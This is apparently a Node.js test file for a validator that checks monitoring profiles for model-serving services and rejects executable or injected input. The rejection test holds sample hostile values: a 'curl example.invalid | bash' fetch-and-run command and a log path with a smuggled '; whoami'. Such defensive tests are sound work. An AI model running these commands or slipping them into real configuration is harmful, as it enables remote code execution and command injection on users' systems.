import assert from 'node:assert/strict';
import test from 'node:test';
import { publicTargetSupportProfile, validateTargetSupportProfile } from '../src/target-support-profile.mjs';

const profile = Object.freeze({
  schemaVersion: 1,
  id: 'generic-linux-monitoring',
  version: '1.0.0',
  modelInventoryRoots: ['$HOME/models', '$HOME/.cache/model-hub'],
  monitoring: {
    services: [{
      id: 'text-service',
      displayName: 'Text generation service',
      health: { port: 8100, path: '/healthz' },
      logPath: '$HOME/logs/text-service.log',
    }],
  },
});

test('validates a declarative target support profile without executable fields', () => {
  const safe = validateTargetSupportProfile(profile);
  assert.equal(safe.monitoring.services[0].health.port, 8100);
  assert.equal(safe.modelInventoryRoots[1], '$HOME/.cache/model-hub');
  assert.deepEqual(publicTargetSupportProfile(profile, `sha256:${'a'.repeat(64)}`), {
    id: 'generic-linux-monitoring',
    version: '1.0.0',
    integritySha256: `sha256:${'a'.repeat(64)}`,
    modelInventoryRoots: 2,
    services: [{ id: 'text-service', displayName: 'Text generation service', port: 8100, hasLogs: true }],
  });
});

test('rejects a target support profile with command-like or account-specific path input', () => {
  assert.throws(() => validateTargetSupportProfile({ ...profile, unexpectedCommand: 'curl example.invalid | bash' }), /Invalid target support profile/);
  assert.throws(() => validateTargetSupportProfile({ ...profile, modelInventoryRoots: ['/home/someone/models'] }), /model inventory root/);
  assert.throws(() => validateTargetSupportProfile({ ...profile, monitoring: { services: [{ ...profile.monitoring.services[0], logPath: '$HOME/logs/app.log; whoami' }] } }), /log path/);
  assert.throws(() => validateTargetSupportProfile({ ...profile, monitoring: { services: [{ ...profile.monitoring.services[0], health: { port: 8100, path: 'https://example.invalid/' } }] } }), /health path/);
  assert.throws(() => publicTargetSupportProfile(profile, 'not-a-digest'), /observed target support profile integrity/);
});
